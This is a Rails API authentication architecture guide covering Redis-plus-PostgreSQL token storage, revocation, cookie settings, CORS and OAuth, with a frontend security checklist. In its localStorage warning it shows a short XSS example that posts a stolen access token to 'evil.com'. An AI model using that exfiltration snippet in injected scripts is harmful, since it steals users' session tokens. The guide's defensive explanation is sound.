# Authentication Architecture Guide

This document explains the recommended authentication architecture for this Rails API template, focusing on access token management with Redis and PostgreSQL.

## Table of Contents

- [Overview](#overview)
- [Architecture Decision](#architecture-decision)
- [Why Redis + PostgreSQL?](#why-redis--postgresql)
- [Token Storage Strategy](#token-storage-strategy)
- [Implementation Concepts](#implementation-concepts)
- [Security Best Practices](#security-best-practices)
- [Performance Considerations](#performance-considerations)
- [Alternatives Comparison](#alternatives-comparison)
- [Frontend Token Storage](#frontend-token-storage)
  - [Browser Storage Options](#browser-storage-options)
  - [Recommended: httpOnly Cookie](#recommended-httponly-cookie)
  - [High Security: Memory Storage](#high-security-memory-storage)
  - [OAuth 2.0 Integration](#oauth-20-integration)
  - [Frontend Security Checklist](#frontend-security-checklist)

## Overview

For API-only Rails applications, you need a strategy to authenticate users across stateless HTTP requests. This guide recommends a **hybrid approach** using both Redis and PostgreSQL.

```
┌─────────────────────────────────────────────────────────────┐
│                    Client Request                            │
│            Authorization: Bearer <token>                     │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
            ┌────────────────────────┐
            │  Token Verification    │
            │  1. Check Redis cache  │◄────── Fast path (< 1ms)
            │  2. Check PostgreSQL   │◄────── Fallback (5-20ms)
            │  3. Return user        │
            └────────────┬───────────┘
                         │
                         ▼
            ┌────────────────────────┐
            │  Authorized Request    │
            │  Processing            │
            └────────────────────────┘
```

## Architecture Decision

### Recommended: Redis (Cache) + PostgreSQL (Source of Truth)

**Storage**:
- PostgreSQL: Stores token digest, metadata, audit information
- Redis (redis_session): Caches token → user_id mapping for fast lookup

**Workflow**:
1. **Login**: Create token, save to PostgreSQL, cache in Redis
2. **Request**: Check Redis first (fast), fallback to PostgreSQL
3. **Logout**: Delete from both Redis and PostgreSQL

**Benefits**:
- ⚡ Fast: 95%+ requests served from Redis (< 1ms)
- 🔒 Reliable: PostgreSQL ensures no data loss
- 🚀 Scalable: Redis handles high request rates
- 📊 Auditable: PostgreSQL tracks token history
- 🛡️ Recoverable: Works even if Redis fails

## Why Redis + PostgreSQL?

### The Problem with JWT Only

**JWT (JSON Web Tokens)**:
```ruby
token = JWT.encode({ user_id: user.id, exp: 24.hours.from_now }, secret)
```

**Pros**:
- Stateless (no storage needed)
- Fast verification
- Can include claims (roles, permissions)

**Fatal Flaws**:
- ❌ **Cannot revoke** (until expiration)
- ❌ **Cannot track active sessions**
- ❌ **Security risk**: Stolen token works until expiry

**Example scenario**:
```
1. User reports: "My account was hacked!"
2. You: "I'll immediately revoke all sessions"
3. Reality: ❌ Cannot revoke JWT tokens
4. Hacker: Still has valid JWT for next 24 hours
```

### The Problem with Redis Only

**Redis-only tokens**:
```ruby
token = SecureRandom.hex(32)
REDIS_SESSION.with { |r| r.setex("token:#{token}", 24.hours, user.id) }
```

**Pros**:
- Fast lookup
- Easy to revoke
- Simple implementation

**Fatal Flaws**:
- ❌ **Data loss risk**: Redis restart = all users logged out
- ❌ **No audit trail**: Cannot track token history
- ❌ **No recovery**: Lost data is gone forever

**Example scenario**:
```
1. Redis crashes/restarts
2. All 10,000 active users: ❌ Logged out immediately
3. Support tickets: 📈📈📈
4. You: "Sorry, we lost all sessions"
```

### The Solution: Redis + PostgreSQL

**Hybrid approach**:
```ruby
# On login:
1. Generate opaque token
2. Save to PostgreSQL (with digest, metadata)
3. Cache in Redis (token → user_id)

# On request:
1. Check Redis (fast path)
2. If miss, check PostgreSQL (slow path + warm Redis)
3. Return user

# On logout:
1. Mark as revoked in PostgreSQL
2. Delete from Redis (immediate effect)
```

**Achieves**:
- ✅ Speed: Redis cache (< 1ms)
- ✅ Reliability: PostgreSQL persistence
- ✅ Revocation: Delete Redis key (immediate)
- ✅ Audit: PostgreSQL tracks everything
- ✅ Recovery: Redis crash = minor slowdown (not disaster)

## Token Storage Strategy

### PostgreSQL Schema

**Recommended structure**:
```ruby
# app/models/access_token.rb
class AccessToken < ApplicationRecord
  belongs_to :user

  # Columns:
  # - token_digest:string (indexed, unique) - SHA256 of token
  # - user_id:integer (indexed) - Owner
  # - expires_at:datetime (indexed) - Expiration
  # - revoked_at:datetime (indexed) - Revocation timestamp
  # - last_used_at:datetime - Last access time
  # - ip_address:string - Created from IP
  # - user_agent:string - Browser/app info
  # - created_at:datetime
  # - updated_at:datetime
end
```

**Why store digest, not plaintext?**
```ruby
# ❌ Never store plaintext
token = "abc123"
AccessToken.create!(token: token)  # Database breach = all tokens stolen

# ✅ Store digest
token = SecureRandom.urlsafe_base64(32)
digest = Digest::SHA256.hexdigest(token)
AccessToken.create!(token_digest: digest)  # Database breach = tokens safe

# Token only exposed once (on login response)
# Cannot be recovered from database
```

### Redis Storage

**Structure**:
```ruby
# Simple key-value mapping
key: "token:#{raw_token}"
value: user_id (or JSON with more data)
TTL: same as token expiry
```

**Example**:
```ruby
REDIS_SESSION.with do |redis|
  redis.setex(
    "token:abc123xyz",
    24.hours.to_i,
    user.id.to_s
  )
end
```

**Why redis_session, not redis_cache?**
- redis_session: `noeviction` + AOF persistence
- redis_cache: `allkeys-lru` (tokens could be evicted!)

See [REDIS_ARCHITECTURE.md](./REDIS_ARCHITECTURE.md) for details.

## Implementation Concepts

### Token Generation

**Conceptual flow**:
```ruby
def create_token_for(user)
  # 1. Generate cryptographically secure token
  token = SecureRandom.urlsafe_base64(32)  # 256-bit entropy

  # 2. Create database record
  record = AccessToken.create!(
    user: user,
    token_digest: Digest::SHA256.hexdigest(token),
    expires_at: 24.hours.from_now,
    ip_address: request.remote_ip,
    user_agent: request.user_agent
  )

  # 3. Cache in Redis
  REDIS_SESSION.with do |redis|
    redis.setex(
      "token:#{token}",
      24.hours.to_i,
      user.id
    )
  end

  # 4. Return token (only time it's visible)
  token
end
```

### Token Verification

**Conceptual flow**:
```ruby
def authenticate_token(token)
  # 1. Fast path: Check Redis cache
  user_id = REDIS_SESSION.with { |r| r.get("token:#{token}") }

  if user_id
    return User.find(user_id)
  end

  # 2. Slow path: Check PostgreSQL
  digest = Digest::SHA256.hexdigest(token)
  record = AccessToken.active.find_by(token_digest: digest)

  if record
    # 3. Warm Redis cache
    REDIS_SESSION.with do |redis|
      ttl = (record.expires_at - Time.current).to_i
      redis.setex("token:#{token}", ttl, record.user_id)
    end

    # 4. Update last_used_at (async recommended)
    record.update_column(:last_used_at, Time.current)

    return record.user
  end

  nil  # Invalid token
end
```

**Cache hit rate**: Typically 95-99% (Redis serves most requests)

### Token Revocation

**Conceptual flow**:
```ruby
def revoke_token(token)
  digest = Digest::SHA256.hexdigest(token)

  # 1. Mark as revoked in PostgreSQL
  record = AccessToken.find_by(token_digest: digest)
  record&.update!(revoked_at: Time.current)

  # 2. Delete from Redis (immediate effect)
  REDIS_SESSION.with { |r| r.del("token:#{token}") }
end
```

**Why both?**
- PostgreSQL: Audit trail (who revoked, when)
- Redis: Immediate effect (next request sees revocation)

## Security Best Practices

### 1. Token Entropy

```ruby
# ✅ Good: 256-bit entropy
SecureRandom.urlsafe_base64(32)  # 43 chars, URL-safe

# ❌ Bad: Low entropy
SecureRandom.hex(8)  # Only 64-bit (bruteforceable)
```

### 2. Short Expiration

```ruby
# ✅ Access tokens: Short-lived
expires_at: 1.day.from_now  # or even 1.hour

# ✅ Refresh tokens: Longer-lived (separate implementation)
refresh_token_expires_at: 30.days.from_now
```

**Refresh token pattern**:
- Access token: 1 hour (for API requests)
- Refresh token: 30 days (to get new access token)
- Stolen access token: Limited damage (1 hour)

### 3. Never Store Plaintext

```ruby
# ❌ NEVER
AccessToken.create!(token: raw_token)

# ✅ ALWAYS
AccessToken.create!(token_digest: Digest::SHA256.hexdigest(raw_token))
```

### 4. Secure Transmission

```ruby
# ✅ HTTPS only in production
config.force_ssl = true

# ✅ Authorization header (not URL/body)
Authorization: Bearer <token>

# ❌ Never in URL
GET /api/users?token=abc123  # Logged in server logs!
```

### 5. Rate Limiting

```ruby
# Use Rack::Attack to prevent brute force
Rack::Attack.throttle('logins/email', limit: 5, period: 1.minute) do |req|
  req.params['email'] if req.path == '/api/login' && req.post?
end
```

### 6. IP and User-Agent Tracking

```ruby
# Detect suspicious activity
if token.ip_address != request.remote_ip
  # Log suspicious activity
  # Maybe require re-authentication
  # Or send alert to user
end
```

### 7. Token Rotation

```ruby
# After password change, revoke all tokens
user.access_tokens.active.each(&:revoke!)

# After suspicious activity
user.access_tokens.where('created_at < ?', 1.hour.ago).each(&:revoke!)
```

## Performance Considerations

### Redis Cache Hit Rate

**Target**: > 95% cache hit rate

**Calculation**:
```ruby
# Monitor in production
total_requests = 10000
redis_hits = 9500
cache_hit_rate = (redis_hits / total_requests.to_f) * 100
# => 95%
```

**If hit rate is low**:
- Increase Redis memory
- Increase token TTL in Redis
- Check Redis eviction policy (should be `noeviction`)

### Database Connection Pool

```ruby
# config/database.yml
production:
  pool: <%= ENV.fetch("RAILS_MAX_THREADS", 16) %>
```

**Important**: Even with Redis cache, PostgreSQL pool must handle:
- Cache misses (5%)
- Token creation (logins)
- Token revocation (logouts)

### Async Updates

```ruby
# ❌ Slow: Update last_used_at synchronously
token.update!(last_used_at: Time.current)  # Blocks request

# ✅ Fast: Update asynchronously
UpdateTokenLastUsedJob.perform_later(token.id)
```

### Token Cleanup

```ruby
# Delete expired tokens (run daily via cron)
AccessToken.where('expires_at < ?', 30.days.ago).delete_all
```

**Why 30 days ago, not today?**
- Keep expired tokens for audit
- Delete only old expired tokens

## Alternatives Comparison

### Option 1: JWT with Blacklist

**Concept**:
- Use JWT for most requests (stateless)
- Blacklist revoked JWTs in Redis

```ruby
# Verify JWT
def valid_token?(jwt)
  decoded = JWT.decode(jwt, secret)[0]
  jti = decoded['jti']  # JWT ID

  # Check blacklist
  !REDIS_SESSION.with { |r| r.exists?("blacklist:#{jti}") }
end

# Revoke JWT
def revoke_jwt(jwt)
  decoded = JWT.decode(jwt, secret)[0]
  jti = decoded['jti']
  exp = decoded['exp']

  # Add to blacklist (only until expiry)
  ttl = exp - Time.current.to_i
  REDIS_SESSION.with { |r| r.setex("blacklist:#{jti}", ttl, 1) }
end
```

**Pros**:
- 99% requests don't need storage (just verify signature)
- Scalable (stateless)

**Cons**:
- Still need Redis (blacklist)
- Still need PostgreSQL (audit, if wanted)
- More complex than opaque tokens
- Blacklist can grow large

**When to use**: High-scale APIs (> 100k RPS) where DB is bottleneck

### Option 2: PostgreSQL Only

**Concept**:
- Store all tokens in PostgreSQL
- No Redis cache

**Pros**:
- Simple architecture
- Reliable (no Redis dependency)
- Complete audit trail

**Cons**:
- Slow (5-20ms per request)
- High database load (every API request queries DB)
- Limited scalability

**When to use**: Low-traffic internal APIs, or when simplicity > performance

### Option 3: Rails Sessions (Cookies)

**Concept**:
- Use Rails' built-in session management
- Store session ID in cookie

**Pros**:
- Built into Rails
- Simple to implement

**Cons**:
- ❌ **Not suitable for APIs** (cookies don't work well with mobile apps, SPAs)
- ❌ CSRF protection needed
- ❌ Cookie size limits

**When to use**: Traditional Rails apps with server-rendered views (not APIs)

## Frontend Token Storage

This section covers how frontend applications (web browsers, mobile apps) should store authentication tokens when consuming your Rails API.

### Browser Storage Options

When building frontend applications that consume your API, you need to decide where to store the authentication token. This is a **critical security decision**.

**Available options**:

| Storage Type | Security | Persistence | Recommended |
|-------------|----------|-------------|-------------|
| **localStorage** | ❌ Low | Survives page refresh | **NO** |
| **sessionStorage** | ❌ Low | Cleared on tab close | **NO** |
| **httpOnly Cookie** | ✅ High | Configurable | **YES** |
| **Memory only** | ✅ Highest | Lost on page refresh | For high-security scenarios |

### Recommended: httpOnly Cookie

**Architecture overview**:

```
┌─────────────────────────────────────────────────────────────────┐
│                     Login Flow                                   │
└─────────────────────────────────────────────────────────────────┘

Frontend (React/Vue)              Backend (Rails API)
      │                                  │
      │  POST /api/auth/login            │
      │  { email, password }             │
      ├─────────────────────────────────>│
      │                                  │
      │                              1. Verify credentials
      │                              2. Generate tokens:
      │                                 - access_token (15-30 min)
      │                                 - refresh_token (7-30 days)
      │                              3. Set httpOnly cookies
      │                                  │
      │  Set-Cookie: access_token=...   │
      │  Set-Cookie: refresh_token=...  │
      │<─────────────────────────────────┤
      │                                  │
   Cookies stored                        │
   (auto-sent with                       │
    each request)                        │


┌─────────────────────────────────────────────────────────────────┐
│                     API Request Flow                             │
└─────────────────────────────────────────────────────────────────┘

Frontend                          Backend
      │                                  │
      │  GET /api/users/profile          │
      │  Cookie: access_token=...        │
      ├─────────────────────────────────>│
      │                              1. Verify token
      │                              2. Check Redis/PostgreSQL
      │                              3. Return user data
      │                                  │
      │  { id: 1, name: "..." }         │
      │<─────────────────────────────────┤
      │                                  │


┌─────────────────────────────────────────────────────────────────┐
│                Token Refresh Flow (when access_token expires)    │
└─────────────────────────────────────────────────────────────────┘

Frontend                          Backend
      │                                  │
      │  GET /api/users/profile          │
      │  Cookie: access_token=expired    │
      ├─────────────────────────────────>│
      │                              1. Verify token
      │                              2. Token expired ❌
      │                                  │
      │  401 Unauthorized                │
      │<─────────────────────────────────┤
      │                                  │
  Frontend auto-retry:                   │
      │                                  │
      │  POST /api/auth/refresh          │
      │  Cookie: refresh_token=...       │
      ├─────────────────────────────────>│
      │                              1. Verify refresh_token
      │                              2. Generate new access_token
      │                              3. Set new cookie
      │                                  │
      │  Set-Cookie: access_token=new   │
      │<─────────────────────────────────┤
      │                                  │
      │  Retry original request          │
      │  GET /api/users/profile          │
      ├─────────────────────────────────>│
      │                                  │
      │  { id: 1, name: "..." }         │
      │<─────────────────────────────────┤
```

**Why httpOnly Cookie?**

✅ **Advantages**:
- JavaScript cannot access the token (protection against XSS attacks)
- Automatically sent with every request (no manual header management)
- Can set security flags (`secure`, `sameSite`)
- Works seamlessly with CORS when configured properly

❌ **Why NOT localStorage/sessionStorage?**:
```javascript
// ❌ VULNERABLE to XSS attacks
localStorage.setItem('access_token', token);

// If attacker injects malicious script:
const stolen = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: stolen  // Token stolen!
});
```

**Backend configuration** (Rails):

```ruby
# Set httpOnly cookies on login
def login
  user = authenticate_user(params[:email], params[:password])

  if user
    access_token = generate_access_token(user)
    refresh_token = generate_refresh_token(user)

    # Set access token cookie
    cookies.encrypted[:access_token] = {
      value: access_token,
      httponly: true,           # JavaScript cannot read
      secure: Rails.env.production?,  # HTTPS only
      same_site: :strict,       # CSRF protection
      expires: 30.minutes.from_now
    }

    # Set refresh token cookie
    cookies.encrypted[:refresh_token] = {
      value: refresh_token,
      httponly: true,
      secure: Rails.env.production?,
      same_site: :strict,
      expires: 7.days.from_now
    }

    render json: { message: 'Login successful' }
  end
end

# Verify token from cookie on each request
def authenticate_user!
  token = cookies.encrypted[:access_token]
  @current_user = authenticate_token(token)  # Use Redis + PostgreSQL

  render json: { error: 'Unauthorized' }, status: :unauthorized unless @current_user
end

# Refresh access token
def refresh
  refresh_token = cookies.encrypted[:refresh_token]

  if valid_refresh_token?(refresh_token)
    user = user_from_refresh_token(refresh_token)
    new_access_token = generate_access_token(user)

    cookies.encrypted[:access_token] = {
      value: new_access_token,
      httponly: true,
      secure: Rails.env.production?,
      same_site: :strict,
      expires: 30.minutes.from_now
    }

    render json: { message: 'Token refreshed' }
  else
    render json: { error: 'Invalid refresh token' }, status: :unauthorized
  end
end
```

**Frontend usage** (React/Vue/Angular):

```javascript
// No need to manually manage tokens!
// Cookies are automatically sent with each request

// Login
async function login(email, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',  // IMPORTANT: send/receive cookies
    body: JSON.stringify({ email, password })
  });

  // Cookies are automatically set by browser
  return response.ok;
}

// Make authenticated requests
async function fetchUserProfile() {
  const response = await fetch('/api/users/profile', {
    credentials: 'include'  // IMPORTANT: send cookies
  });

  // Handle token expiration
  if (response.status === 401) {
    // Try refreshing token
    const refreshed = await refreshToken();
    if (refreshed) {
      // Retry original request
      return fetchUserProfile();
    } else {
      // Refresh failed, redirect to login
      window.location.href = '/login';
    }
  }

  return response.json();
}

// Refresh token automatically
async function refreshToken() {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include'
  });
  return response.ok;
}

// Logout
async function logout() {
  await fetch('/api/auth/logout', {
    method: 'DELETE',
    credentials: 'include'
  });
  // Cookies are automatically cleared by backend
}
```

**CORS configuration** (required for cookies):

```ruby
# config/initializers/cors.rb
Rails.application.config.middleware.insert_before 0, Rack::Cors do
  allow do
    # IMPORTANT: Cannot use '*' when credentials: true
    origins 'https://your-frontend.com', 'http://localhost:3000'

    resource '/api/*',
      headers: :any,
      methods: [:get, :post, :put, :patch, :delete, :options],
      credentials: true  # REQUIRED for cookies
  end
end
```

**Token expiration strategy**:

| Token Type | Expiration | Storage | Purpose |
|-----------|-----------|---------|---------|
| Access Token | 15-30 minutes | httpOnly cookie | API requests |
| Refresh Token | 7-30 days | httpOnly cookie | Renew access token |

**Benefits of dual-token approach**:
- Short-lived access token limits damage if stolen
- Long-lived refresh token provides good UX (no frequent logins)
- Can revoke refresh tokens immediately (stored in PostgreSQL)

### High Security: Memory Storage

For applications with extreme security requirements (banking, healthcare), consider storing access tokens only in **JavaScript memory** (not cookies or localStorage).

**Architecture**:

```
┌─────────────────────────────────────────────────────────────────┐
│                     High-Security Flow                           │
└─────────────────────────────────────────────────────────────────┘

1. Login:
   - Backend returns access_token in JSON response (NOT cookie)
   - Backend sets refresh_token in httpOnly cookie
   - Frontend stores access_token in React/Vue state (memory only)

2. API Requests:
   - Frontend manually adds Authorization header
   - Token never persisted to disk/storage

3. Page Refresh:
   - Memory cleared (access_token lost)
   - Frontend automatically requests new access_token using refresh_token
   - User experience: seamless (no re-login needed)

4. Close Browser:
   - Memory cleared
   - Refresh token cookie cleared (session cookie)
   - Next visit: must login again
```

**Implementation concept** (React):

```javascript
// Store token only in React state (memory)
function App() {
  const [accessToken, setAccessToken] = useState(null);

  // On app startup, get fresh access token
  useEffect(() => {
    async function initAuth() {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include'  // Send refresh_token cookie
      });

      if (response.ok) {
        const { access_token } = await response.json();
        setAccessToken(access_token);  // Store in memory only
      }
    }

    initAuth();
  }, []);

  // Make API requests with token from memory
  async function apiRequest(url, options = {}) {
    return fetch(url, {
      ...options,
      headers: {
        'Authorization': `Bearer ${accessToken}`,  // From memory
        ...options.headers
      }
    });
  }
}
```

**Backend returns token in JSON** (not cookie):

```ruby
def refresh
  refresh_token = cookies.encrypted[:refresh_token]

  if valid_refresh_token?(refresh_token)
    user = user_from_refresh_token(refresh_token)
    new_access_token = generate_access_token(user)

    # Return in JSON body (frontend stores in memory)
    render json: { access_token: new_access_token }
  end
end
```

**Comparison**:

| Aspect | httpOnly Cookie | Memory + Refresh Token |
|--------|----------------|------------------------|
| Security | High | Highest |
| UX | Seamless | Good (auto-refresh on reload) |
| XSS Protection | ✅ Complete | ✅ Complete |
| Persistence | Survives reload | Lost on reload (auto-restored) |
| Implementation | Simple | More complex |
| Use Cases | Most applications | Banking, healthcare, finance |

### OAuth 2.0 Integration

For third-party authentication (Google, GitHub, etc.), use OAuth 2.0 Authorization Code Flow.

**Architecture**:

```
┌─────────────────────────────────────────────────────────────────┐
│              OAuth 2.0 Authorization Code Flow                   │
└─────────────────────────────────────────────────────────────────┘

Frontend              Your Backend           OAuth Provider (Google)
   │                        │                         │
   │  Click "Login with     │                         │
   │  Google"               │                         │
   │                        │                         │
   │  1. Redirect to OAuth provider                   │
   │────────────────────────┼────────────────────────>│
   │                        │                         │
   │                   User authenticates              │
   │                   with Google                     │
   │                        │                         │
   │  2. Redirect back with authorization code        │
   │<───────────────────────┼─────────────────────────┤
   │                        │                         │
   │  3. Send code to backend                         │
   │───────────────────────>│                         │
   │                        │                         │
   │                        │  4. Exchange code       │
   │                        │     for access token    │
   │                        │────────────────────────>│
   │                        │                         │
   │                        │  5. Return access token │
   │                        │<────────────────────────┤
   │                        │                         │
   │                        │  6. Get user profile    │
   │                        │────────────────────────>│
   │                        │                         │
   │                        │  7. Return profile      │
   │                        │<────────────────────────┤
   │                        │                         │
   │                   8. Create/find user            │
   │                   9. Generate YOUR tokens        │
   │                   10. Set cookies                │
   │                        │                         │
   │  11. Success response  │                         │
   │<───────────────────────┤                         │
   │                        │                         │
```

**Key principle**: OAuth token is used **once** to authenticate the user with your backend, then your backend issues **its own tokens** (stored in httpOnly cookies or memory).

**Conceptual flow**:

```ruby
# Backend endpoint: OAuth callback
def oauth_callback
  # 1. Exchange authorization code for OAuth access token
  oauth_token = exchange_code_for_token(params[:code])

  # 2. Get user profile from OAuth provider
  profile = fetch_oauth_profile(oauth_token)

  # 3. Find or create user in YOUR database
  user = User.find_or_create_by(
    email: profile[:email],
    oauth_provider: 'google',
    oauth_uid: profile[:id]
  )

  # 4. Generate YOUR tokens (same as password login)
  access_token = generate_access_token(user)
  refresh_token = generate_refresh_token(user)

  # 5. Set YOUR tokens in httpOnly cookies
  cookies.encrypted[:access_token] = { ... }
  cookies.encrypted[:refresh_token] = { ... }

  # 6. Redirect to frontend app
  redirect_to "#{ENV['FRONTEND_URL']}/auth/success"
end
```

**After OAuth login**, the authentication flow is **identical** to password-based login:
- Frontend sends requests with cookies
- Backend verifies tokens from Redis + PostgreSQL
- Token refresh works the same way

**Popular OAuth gems**:
- `omniauth` - OAuth provider abstraction
- `omniauth-google-oauth2` - Google login
- `omniauth-github` - GitHub login

### Frontend Security Checklist

When implementing frontend authentication, ensure these security measures are in place:

#### Backend Requirements

- [ ] **HTTPS enabled** in production (`config.force_ssl = true`)
- [ ] **Cookie flags** properly set:
  - [ ] `httponly: true` (prevent JavaScript access)
  - [ ] `secure: true` in production (HTTPS only)
  - [ ] `same_site: :strict` or `:lax` (CSRF protection)
- [ ] **CORS configured** with:
  - [ ] Specific origins (not `*`)
  - [ ] `credentials: true` for cookies
- [ ] **Token expiration** properly configured:
  - [ ] Access token: 15-30 minutes
  - [ ] Refresh token: 7-30 days
- [ ] **Rate limiting** on authentication endpoints (use Rack::Attack)
- [ ] **Token revocation** implemented (logout, password change)

#### Frontend Requirements

- [ ] **Never store tokens** in localStorage/sessionStorage
- [ ] **Use credentials: 'include'** in all fetch() calls
- [ ] **Implement auto-refresh** when access token expires
- [ ] **Handle 401 errors** gracefully (refresh or redirect to login)
- [ ] **Clear tokens on logout** (call backend logout endpoint)
- [ ] **No tokens in URLs** (query parameters, hash fragments)
- [ ] **No tokens in logs** (avoid console.log with tokens)

#### Security Testing

- [ ] **Test XSS protection**: Ensure localStorage not used
- [ ] **Test CSRF protection**: Verify `sameSite` cookie flag works
- [ ] **Test token revocation**: Logout should immediately invalidate token
- [ ] **Test token refresh**: Expired access token should auto-refresh
- [ ] **Test CORS**: Verify credentials work with allowed origins
- [ ] **Test HTTPS**: Ensure cookies not sent over HTTP in production

#### Recommended Token Expiration

| Application Type | Access Token | Refresh Token | Rationale |
|-----------------|--------------|---------------|-----------|
| Public web app | 30 minutes | 7 days | Balance security/UX |
| Internal admin | 15 minutes | 1 day | Higher security |
| Mobile app | 1 hour | 30 days | Reduce refresh frequency |
| Banking/Finance | 5 minutes | Session only | Maximum security |

#### Common Mistakes to Avoid

❌ **Don't do this**:
```javascript
// Storing token in localStorage (vulnerable to XSS)
localStorage.setItem('token', token);

// Including token in URL (logged in server logs)
fetch(`/api/users?token=${token}`);

// Not using credentials: 'include' (cookies won't be sent)
fetch('/api/users');  // Missing credentials option
```

✅ **Do this instead**:
```javascript
// Let httpOnly cookies handle token storage
// No manual token management needed

// Always use credentials: 'include'
fetch('/api/users', {
  credentials: 'include'
});

// Handle token refresh automatically
async function apiRequest(url, options = {}) {
  let response = await fetch(url, {
    ...options,
    credentials: 'include'
  });

  if (response.status === 401) {
    // Try refresh
    const refreshed = await refreshToken();
    if (refreshed) {
      // Retry
      response = await fetch(url, {
        ...options,
        credentials: 'include'
      });
    }
  }

  return response;
}
```

## Summary

**Recommended**: Redis (redis_session) + PostgreSQL

**Why**:
- ✅ Fast (< 1ms typical response)
- ✅ Reliable (PostgreSQL persistence)
- ✅ Secure (immediate revocation)
- ✅ Auditable (complete history)
- ✅ Scalable (Redis handles load)

**Not recommended**: JWT-only (cannot revoke)

**Implementation**: Left to developer based on specific requirements

**Key Principle**: Use `redis_session` instance (not `redis_cache`) to prevent token eviction

See also: [Redis Architecture Guide](./REDIS_ARCHITECTURE.md)
